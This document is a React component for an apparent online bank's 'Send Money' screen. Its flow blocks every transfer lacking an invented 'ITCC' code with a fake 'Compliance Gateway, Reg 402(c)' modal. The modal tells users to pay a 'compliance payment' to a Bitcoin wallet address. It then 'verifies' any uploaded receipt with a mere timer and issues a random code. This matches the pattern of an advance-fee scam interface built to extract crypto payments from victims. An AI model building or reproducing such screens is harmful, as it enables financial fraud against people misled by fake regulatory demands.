
import React, { useState, useEffect, useMemo } from 'react';
import { ACCOUNTS, CONTACTS, CURRENCY_RATES } from '../../../constants';
import { CURRENCIES } from '../../../i18n';
import type { ViewType, Account, Contact } from '../../../types';
import { formatCurrency } from '../../../utils/formatters';
import { useDashboard } from '../../../contexts/DashboardContext';
import PaymentReceipt from './PaymentReceipt';

interface SendMoneyProps {
    setActiveView: (view: ViewType) => void;
}

const SendMoney: React.FC<SendMoneyProps> = ({ setActiveView }) => {
    const { addReceiptAndNavigate } = useDashboard();
    
    const [step, setStep] = useState(1);
    const [amount, setAmount] = useState('');
    const [selectedContact, setSelectedContact] = useState<Contact | null>(null);
    const [fromAccount, setFromAccount] = useState<Account>(ACCOUNTS[0]);
    const [targetCurrency, setTargetCurrency] = useState('USD');
    const [note, setNote] = useState('');
    
    // ITCC Logic
    const [itccCode, setItccCode] = useState('');
    const [showComplianceModal, setShowComplianceModal] = useState(false);
    const [complianceMode, setComplianceMode] = useState<'code' | 'redirect'>('code');
    
    // Wallet / Redirect Logic
    const [paymentProof, setPaymentProof] = useState<File | null>(null);
    const [isVerifyingProof, setIsVerifyingProof] = useState(false);
    const [isProofVerified, setIsProofVerified] = useState(false);
    const [issuedItccCode, setIssuedItccCode] = useState('');
    
    const [isVerifyingCode, setIsVerifyingCode] = useState(false);
    const [isProcessing, setIsProcessing] = useState(false);
    const [showReceipt, setShowReceipt] = useState(false);
    const [receiptData, setReceiptData] = useState<any>(null);

    // Simulated FX Rate for Send Money
    const [simulatedRate, setSimulatedRate] = useState(1);

    useEffect(() => {
        if (targetCurrency !== 'USD') {
             const baseRate = CURRENCY_RATES.find(r => r.code === targetCurrency)?.rate || 1;
             setSimulatedRate(baseRate);
             const interval = setInterval(() => {
                // Slight fluctuation
                setSimulatedRate(prev => prev * (1 + (Math.random() * 0.0002 - 0.0001)));
             }, 2000);
             return () => clearInterval(interval);
        } else {
            setSimulatedRate(1);
        }
    }, [targetCurrency]);

    const isItccValid = (code: string) => code.trim().toUpperCase().startsWith('ITCC');

    const handleContinueAttempt = () => {
        if (!selectedContact || !amount || parseFloat(amount) <= 0) return;

        // If code is already valid (or issued), proceed
        if (isItccValid(itccCode)) {
            setComplianceMode('code');
            setStep(2);
        } else {
            // Triggers the Mandatory Interruption
            setComplianceMode('code'); 
            setPaymentProof(null);
            setIsProofVerified(false);
            setIssuedItccCode('');
            setShowComplianceModal(true);
        }
    };

    // Called from within the Modal
    const handleResumeWithCode = () => {
        setIsVerifyingCode(true);
        setTimeout(() => {
            setIsVerifyingCode(false);
            setShowComplianceModal(false);
            setStep(2);
        }, 1500); // Simulation delay
    };

    const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
        if (e.target.files && e.target.files[0]) {
            setPaymentProof(e.target.files[0]);
            setIsVerifyingProof(true);
            
            // Simulate Verification Process
            setTimeout(() => {
                setIsVerifyingProof(false);
                setIsProofVerified(true);
                // Issue a mock code
                const newCode = `ITCC-${Math.floor(Math.random() * 10000)}-${Math.floor(Math.random() * 10000)}`;
                setIssuedItccCode(newCode);
                setItccCode(newCode); // Auto-fill the main state
            }, 3000);
        }
    };

    const handleConfirm = () => {
        setIsProcessing(true);
        const amt = parseFloat(amount);
        // No fee deduction here anymore, as they paid externally
        const totalDeduction = amt; 
        
        const converted = amt * simulatedRate;
        
        setTimeout(() => {
            const newReceiptData = {
                vendor: `Payment to ${selectedContact?.name}`,
                vendorLogo: selectedContact?.avatarUrl || '',
                date: new Date().toISOString(),
                total: totalDeduction,
                category: 'Transfers',
                items: [
                    { name: `Transfer to ${selectedContact?.name}`, quantity: 1, price: amt, description: targetCurrency !== 'USD' ? `Converted to ${new Intl.NumberFormat('en-US', { style: 'currency', currency: targetCurrency }).format(converted)}` : undefined },
                ]
            };
            setReceiptData({ ...newReceiptData, id: `temp-${Date.now()}` });
            setIsProcessing(false);
            setShowReceipt(true);
        }, 2500);
    };

    const handleCloseReceipt = () => {
        setShowReceipt(false);
        if (receiptData) {
            addReceiptAndNavigate(receiptData, setActiveView, 'transactions');
        }
    };

    const amountNum = parseFloat(amount) || 0;
    const convertedAmount = amountNum * simulatedRate;

    // Advanced FX Details
    const quoteId = useMemo(() => step === 2 ? `QTE-${Math.random().toString(36).substr(2, 9).toUpperCase()}` : '', [step]);
    const inverseRate = simulatedRate > 0 ? (1 / simulatedRate).toFixed(5) : '0.00000';
    const settlementDate = new Date(); // Immediate for P2P usually
    const settlementDateStr = settlementDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });

    return (
        <div className="animate-fade-in-scale-up max-w-3xl mx-auto relative">
            {step === 1 && (
                <>
                    <div className="mb-8">
                        <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-3">Select Recipient</label>
                        <div className="flex gap-4 overflow-x-auto pb-4 scrollbar-hide">
                            <button className="flex flex-col items-center justify-center min-w-[80px] h-[100px] rounded-xl bg-white/5 border-2 border-dashed border-white/20 hover:border-yellow-400 hover:text-yellow-400 text-gray-400 transition-all group">
                                <div className="w-10 h-10 rounded-full bg-white/5 flex items-center justify-center mb-2 group-hover:bg-yellow-400/10">
                                    <i className="fas fa-plus"></i>
                                </div>
                                <span className="text-[10px] font-bold uppercase">New</span>
                            </button>
                            {CONTACTS.map(contact => (
                                <button 
                                    key={contact.id}
                                    onClick={() => setSelectedContact(contact)}
                                    className={`flex flex-col items-center justify-center min-w-[80px] h-[100px] rounded-xl border-2 transition-all relative ${selectedContact?.id === contact.id ? 'bg-[#1a365d] border-[#e6b325] shadow-lg shadow-blue-900/50' : 'bg-white/5 border-transparent hover:bg-white/10'}`}
                                >
                                    <div className="relative">
                                        <img src={contact.avatarUrl} alt={contact.name} className="w-10 h-10 rounded-full mb-2" />
                                        {selectedContact?.id === contact.id && (
                                            <div className="absolute -top-1 -right-1 w-4 h-4 bg-[#e6b325] rounded-full flex items-center justify-center">
                                                <i className="fas fa-check text-[#1a365d] text-[8px]"></i>
                                            </div>
                                        )}
                                    </div>
                                    <span className="text-xs font-bold text-white truncate w-full px-2">{contact.name.split(' ')[0]}</span>
                                </button>
                            ))}
                        </div>
                    </div>

                    <div className="bg-white/5 rounded-2xl p-6 border border-white/10 mb-8">
                        <div className="flex flex-col md:flex-row gap-6">
                             <div className="flex-grow">
                                <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-2">You Send (USD)</label>
                                <div className="relative">
                                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-2xl text-gray-500">$</span>
                                    <input 
                                        type="number" 
                                        value={amount} 
                                        onChange={e => setAmount(e.target.value)} 
                                        className="w-full bg-black/20 border border-white/10 rounded-xl py-4 pl-10 pr-4 text-3xl font-mono font-bold text-white focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400 transition-all"
                                        placeholder="0.00"
                                    />
                                </div>
                             </div>
                             <div className="md:w-1/3">
                                <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-2">Recipient Receives</label>
                                <select 
                                    className="w-full bg-black/20 border border-white/10 rounded-xl py-4 px-4 text-sm font-bold text-white focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400 transition-all appearance-none"
                                    onChange={e => setTargetCurrency(e.target.value)}
                                    value={targetCurrency}
                                >
                                    {CURRENCIES.map(c => <option key={c.code} value={c.code}>{c.code} ({c.flag})</option>)}
                                </select>
                             </div>
                        </div>
                        
                        {targetCurrency !== 'USD' && amountNum > 0 && (
                             <div className="mt-3 flex items-center justify-between text-xs text-gray-400 px-1">
                                 <span>Exchange Rate: 1 USD ≈ {simulatedRate.toFixed(4)} {targetCurrency}</span>
                                 <span className="text-green-400 font-bold">
                                     Est. Total: {new Intl.NumberFormat('en-US', { style: 'currency', currency: targetCurrency }).format(convertedAmount)}
                                 </span>
                             </div>
                        )}

                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6 pt-4 border-t border-white/5">
                             <div>
                                <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-2">From Account</label>
                                <select 
                                    className="w-full bg-black/20 border border-white/10 rounded-xl py-3 px-4 text-sm font-bold text-white focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400 transition-all appearance-none"
                                    onChange={e => setFromAccount(ACCOUNTS.find(a => a.id === e.target.value) || ACCOUNTS[0])}
                                    value={fromAccount.id}
                                >
                                    {ACCOUNTS.filter(a => a.type !== 'Credit').map(acc => (
                                        <option key={acc.id} value={acc.id}>{acc.type} (...{acc.number.slice(-4)})</option>
                                    ))}
                                </select>
                             </div>
                            <div>
                                <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-2">Note (Optional)</label>
                                <input 
                                    type="text" 
                                    value={note} 
                                    onChange={e => setNote(e.target.value)} 
                                    className="w-full bg-black/20 border border-white/10 rounded-xl py-3 px-4 text-sm text-white placeholder-gray-600 focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400 transition-all"
                                    placeholder="Reference / Memo"
                                />
                            </div>
                        </div>
                        
                        <div className="mt-6">
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-2 flex justify-between">
                                <span>ITCC Code</span>
                                {itccCode && isItccValid(itccCode) && <span className="text-green-400"><i className="fas fa-check"></i> Valid</span>}
                            </label>
                            <input 
                                type="text" 
                                value={itccCode} 
                                onChange={e => setItccCode(e.target.value)} 
                                className={`w-full bg-black/20 border rounded-xl py-3 px-4 text-sm text-white placeholder-gray-600 focus:ring-1 transition-all uppercase font-mono tracking-wider ${itccCode && isItccValid(itccCode) ? 'border-green-500/50 focus:border-green-500 focus:ring-green-500' : 'border-white/10 focus:border-yellow-400 focus:ring-yellow-400'}`}
                                placeholder="Optional at this step"
                            />
                        </div>
                    </div>

                    <div className="flex justify-end">
                        <button 
                            onClick={handleContinueAttempt} 
                            disabled={!selectedContact || amountNum <= 0}
                            className="px-8 py-4 rounded-xl bg-yellow-400 text-[#1a365d] font-bold hover:bg-yellow-300 shadow-lg shadow-yellow-400/20 transition-all transform hover:-translate-y-0.5 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none flex items-center gap-2"
                        >
                            <span>Review Transfer</span>
                            <i className="fas fa-arrow-right"></i>
                        </button>
                    </div>
                </>
            )}

            {/* MANDATORY COMPLIANCE INTERVENTION MODAL */}
            {showComplianceModal && (
                <div className="fixed inset-0 z-[100] bg-[#0f172a]/95 backdrop-blur-xl flex items-center justify-center p-4 animate-fade-in-scale-up">
                    <div className="w-full max-w-lg bg-[#1e293b] border border-red-500/30 rounded-2xl shadow-2xl relative overflow-hidden flex flex-col max-h-[90vh]">
                        {/* Header Strip */}
                        <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-red-600 via-orange-500 to-red-600 animate-pulse"></div>
                        
                        <div className="p-6 pb-0">
                            <div className="flex flex-col items-center text-center mb-6">
                                <div className="w-16 h-16 bg-red-500/10 rounded-full flex items-center justify-center mb-4 border border-red-500/30 shadow-[0_0_30px_rgba(239,68,68,0.2)]">
                                    <i className="fas fa-shield-alt text-3xl text-red-500"></i>
                                </div>
                                <h2 className="text-xl font-bold text-white mb-1">Transaction Halted</h2>
                                <p className="text-red-400 font-mono text-[10px] uppercase tracking-widest border border-red-500/30 px-3 py-0.5 rounded bg-red-500/10">
                                    Compliance Gateway Active • Reg 402(c)
                                </p>
                                <p className="text-gray-400 text-xs mt-3 leading-relaxed max-w-sm">
                                    International Transaction Control Code (ITCC) is missing. This transfer is restricted until verification is provided.
                                </p>
                            </div>

                            {/* Tabs */}
                            <div className="flex bg-black/40 p-1 rounded-xl mb-4">
                                <button 
                                    onClick={() => setComplianceMode('code')}
                                    className={`flex-1 py-2 text-xs font-bold uppercase tracking-wider rounded-lg transition-all ${complianceMode === 'code' ? 'bg-blue-600 text-white shadow-lg' : 'text-gray-500 hover:text-gray-300'}`}
                                >
                                    Enter Code
                                </button>
                                <button 
                                    onClick={() => setComplianceMode('redirect')}
                                    className={`flex-1 py-2 text-xs font-bold uppercase tracking-wider rounded-lg transition-all ${complianceMode === 'redirect' ? 'bg-yellow-500 text-black shadow-lg' : 'text-gray-500 hover:text-gray-300'}`}
                                >
                                    No Code Available
                                </button>
                            </div>
                        </div>

                        {/* Content Area (Scrollable) */}
                        <div className="overflow-y-auto p-6 pt-0">
                            <div className="bg-black/20 rounded-xl p-4 border border-white/5">
                                {complianceMode === 'code' ? (
                                    <div className="space-y-4 animate-fade-in-status-item">
                                        <label className="block text-xs font-bold text-blue-400 uppercase tracking-wider text-center">Resume Transaction</label>
                                        <div className="relative">
                                            <input 
                                                type="text" 
                                                value={itccCode} 
                                                onChange={e => setItccCode(e.target.value)} 
                                                className="w-full bg-[#0f172a] border border-blue-500/30 rounded-xl py-4 px-4 text-lg text-white font-mono placeholder-gray-600 focus:border-blue-400 focus:ring-1 focus:ring-blue-400 transition-all uppercase tracking-widest text-center"
                                                placeholder="ITCC-XXXX-XXXX"
                                                autoFocus
                                            />
                                            {isItccValid(itccCode) && (
                                                <div className="absolute right-4 top-1/2 -translate-y-1/2 text-green-400">
                                                    <i className="fas fa-check-circle text-xl"></i>
                                                </div>
                                            )}
                                        </div>
                                        <button 
                                            onClick={handleResumeWithCode}
                                            disabled={!isItccValid(itccCode) || isVerifyingCode}
                                            className="w-full py-4 rounded-xl bg-gradient-to-r from-blue-600 to-blue-500 text-white font-bold shadow-lg shadow-blue-900/30 hover:from-blue-500 hover:to-blue-400 transition-all disabled:opacity-50 disabled:cursor-not-allowed mt-2 flex items-center justify-center gap-2"
                                        >
                                            {isVerifyingCode ? (
                                                <>
                                                    <i className="fas fa-circle-notch fa-spin"></i> Verifying...
                                                </>
                                            ) : (
                                                <>
                                                    <i className="fas fa-unlock"></i> Verify & Resume
                                                </>
                                            )}
                                        </button>
                                    </div>
                                ) : (
                                    <div className="space-y-5 animate-fade-in-status-item">
                                        {/* Wallet Section */}
                                        <div className="bg-[#0b1120] p-4 rounded-lg border border-yellow-500/20 text-center">
                                            <div className="flex items-center justify-center gap-2 mb-2">
                                                <i className="fas fa-wallet text-yellow-400"></i>
                                                <h4 className="text-white font-bold text-sm">Smart Wallet Gateway</h4>
                                            </div>
                                            <p className="text-[10px] text-gray-400 mb-3">
                                                To acquire an ITCC code, please complete the compliance payment to the smart wallet address below.
                                            </p>
                                            
                                            {/* QR Code Simulation */}
                                            <div className="w-24 h-24 bg-white p-1 mx-auto mb-3 rounded-lg">
                                                <img src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`} alt="QR" className="w-full h-full" />
                                            </div>

                                            <div className="bg-black/40 p-2 rounded border border-white/10 flex items-center justify-between mb-2">
                                                <span className="text-[10px] font-mono text-gray-300 truncate max-w-[200px]">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</span>
                                                <button onClick={() => navigator.clipboard.writeText('bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh')} className="text-yellow-400 hover:text-white">
                                                    <i className="fas fa-copy"></i>
                                                </button>
                                            </div>
                                            <p className="text-[10px] text-yellow-500/80 font-bold">Network: Bitcoin (BTC) / Ethereum (ERC20)</p>
                                        </div>

                                        {/* Proof Upload */}
                                        <div>
                                            <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-2">Verification Required</label>
                                            <div className="border-2 border-dashed border-gray-600 rounded-xl p-4 text-center hover:border-gray-400 transition-colors relative">
                                                <input type="file" onChange={handleFileUpload} className="absolute inset-0 w-full h-full opacity-0 cursor-pointer" />
                                                {isVerifyingProof ? (
                                                     <div className="flex flex-col items-center text-yellow-400">
                                                         <i className="fas fa-circle-notch fa-spin mb-2"></i>
                                                         <span className="text-xs">Verifying Blockchain Transaction...</span>
                                                     </div>
                                                ) : isProofVerified ? (
                                                    <div className="flex flex-col items-center text-green-400">
                                                        <i className="fas fa-check-circle text-2xl mb-1"></i>
                                                        <span className="text-xs font-bold">Payment Verified!</span>
                                                        <span className="text-[10px] text-gray-400">ITCC Code Issued to Email/SMS</span>
                                                    </div>
                                                ) : paymentProof ? (
                                                    <div className="flex flex-col items-center text-blue-400">
                                                        <i className="fas fa-file-upload mb-1"></i>
                                                        <span className="text-xs">{paymentProof.name}</span>
                                                        <span className="text-[10px] text-gray-500">Click to change</span>
                                                    </div>
                                                ) : (
                                                    <div className="flex flex-col items-center text-gray-500">
                                                        <i className="fas fa-upload mb-1"></i>
                                                        <span className="text-xs">Upload Payment Receipt</span>
                                                        <span className="text-[10px]">JPG, PNG, PDF</span>
                                                    </div>
                                                )}
                                            </div>
                                        </div>

                                        {isProofVerified && issuedItccCode && (
                                            <div className="bg-green-500/10 border border-green-500/30 p-3 rounded-lg text-center animate-fade-in-up">
                                                <p className="text-[10px] text-green-400 uppercase font-bold mb-1">Your ITCC Code</p>
                                                <p className="text-lg font-mono font-bold text-white tracking-widest">{issuedItccCode}</p>
                                                <p className="text-[10px] text-gray-400 mt-1">Code automatically applied.</p>
                                            </div>
                                        )}
                                        
                                        <button 
                                            onClick={handleResumeWithCode}
                                            disabled={!isProofVerified}
                                            className="w-full py-3 rounded-xl bg-blue-600 text-white font-bold shadow-lg hover:bg-blue-500 transition-all disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-gray-700"
                                        >
                                            {isProofVerified ? 'Resume Transaction' : 'Awaiting Verification'}
                                        </button>
                                    </div>
                                )}
                            </div>
                            
                            <button 
                                onClick={() => setShowComplianceModal(false)} 
                                className="w-full text-center text-gray-500 text-xs mt-4 hover:text-white transition-colors pb-2"
                            >
                                Cancel Transfer
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {step === 2 && (
                <div className="max-w-md mx-auto">
                    <div className="bg-white/10 backdrop-blur-md border border-white/10 rounded-2xl p-6 shadow-2xl mb-6">
                        <h3 className="text-xl font-bold text-white mb-6 border-b border-white/10 pb-4">Confirm Transfer</h3>
                        
                        <div className="flex items-center justify-between mb-6">
                            <div className="text-center">
                                <div className="w-12 h-12 rounded-full bg-white/10 flex items-center justify-center mb-2 mx-auto">
                                    <i className="fas fa-university text-white"></i>
                                </div>
                                <p className="text-xs text-gray-400">My {fromAccount.type}</p>
                            </div>
                            <div className="flex-grow px-4 relative">
                                <div className="h-0.5 bg-gray-600 w-full absolute top-1/2 left-0 -z-10"></div>
                                <div className="bg-[#1a365d] w-8 h-8 rounded-full flex items-center justify-center mx-auto border-2 border-gray-600">
                                    <i className="fas fa-arrow-right text-white text-xs"></i>
                                </div>
                            </div>
                            <div className="text-center">
                                <div className="relative mx-auto w-12 h-12 mb-2">
                                     <img src={selectedContact?.avatarUrl} className="w-12 h-12 rounded-full" />
                                </div>
                                <p className="text-xs text-gray-400">{selectedContact?.name}</p>
                            </div>
                        </div>

                        <div className="text-center mb-8">
                            <p className="text-xs text-gray-400 uppercase tracking-widest mb-1">Sending Amount</p>
                            <p className="text-4xl font-mono font-bold text-white">{formatCurrency(amountNum)}</p>
                        </div>

                        {targetCurrency !== 'USD' && (
                            <div className="bg-[#0b1120] border border-white/10 rounded-xl p-5 relative overflow-hidden mb-6">
                                <div className="absolute top-0 left-0 w-1 h-full bg-blue-500"></div>
                                <div className="flex justify-between items-start mb-4">
                                    <h4 className="text-blue-400 text-xs font-bold uppercase tracking-widest">FX Trade Ticket</h4>
                                    <span className="text-[10px] font-mono text-gray-500">ID: {quoteId}</span>
                                </div>
                                
                                <div className="grid grid-cols-2 gap-y-3 text-sm">
                                    <div className="text-gray-400">Source Currency</div>
                                    <div className="text-white font-mono text-right">USD (United States Dollar)</div>

                                    <div className="text-gray-400">Target Currency</div>
                                    <div className="text-white font-mono text-right">{targetCurrency}</div>
                                    
                                    <div className="text-gray-400">Spot Rate</div>
                                    <div className="text-white font-mono text-right font-bold text-yellow-400">{simulatedRate.toFixed(5)}</div>
                                    
                                    <div className="text-gray-400">Inverse Rate</div>
                                    <div className="text-white font-mono text-right">1 {targetCurrency} = {inverseRate} USD</div>
                                    
                                    <div className="text-gray-400">Settlement Date</div>
                                    <div className="text-white text-right font-mono">{settlementDateStr}</div>
                                </div>

                                <div className="border-t border-white/10 mt-4 pt-3 flex justify-between items-center">
                                    <span className="text-blue-200 font-bold text-sm">Contra Amount (Credit)</span>
                                    <span className="font-bold text-xl text-white">
                                        {new Intl.NumberFormat('en-US', { style: 'currency', currency: targetCurrency }).format(convertedAmount)}
                                    </span>
                                </div>
                            </div>
                        )}

                        {/* Compliance Status Display in Review */}
                        <div className="mb-6">
                             <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-3 flex items-center gap-3 animate-fade-in-status-item">
                                 <div className="w-8 h-8 rounded-full bg-green-500/20 flex items-center justify-center text-green-400"><i className="fas fa-shield-check"></i></div>
                                 <div>
                                    <span className="text-xs text-green-300 font-bold block">Secure Verified Transfer</span>
                                    <span className="text-[10px] text-green-400/70">Code {itccCode} Applied • Compliance Verified</span>
                                 </div>
                             </div>
                        </div>

                        {note && <div className="bg-white/5 p-3 rounded-lg text-xs text-gray-400 mb-6 text-center italic">"{note}"</div>}

                        <div className="flex gap-4">
                            <button onClick={() => setStep(1)} className="flex-1 py-3 rounded-xl border border-white/20 text-gray-300 font-semibold hover:bg-white/5 transition-colors">Back</button>
                            <button 
                                onClick={handleConfirm} 
                                disabled={isProcessing}
                                className={`flex-1 py-3 rounded-xl font-bold shadow-lg transition-colors flex items-center justify-center gap-2 bg-green-500 hover:bg-green-400 text-white shadow-green-500/20`}
                            >
                                {isProcessing ? <i className="fas fa-circle-notch fa-spin"></i> : <i className="fas fa-paper-plane"></i>}
                                {isProcessing ? 'Processing...' : 'Confirm Send'}
                            </button>
                        </div>
                    </div>
                </div>
            )}

            <PaymentReceipt 
                isOpen={showReceipt} 
                onClose={handleCloseReceipt} 
                receipt={receiptData} 
                setActiveView={setActiveView}
            />
        </div>
    );
};

export default SendMoney;
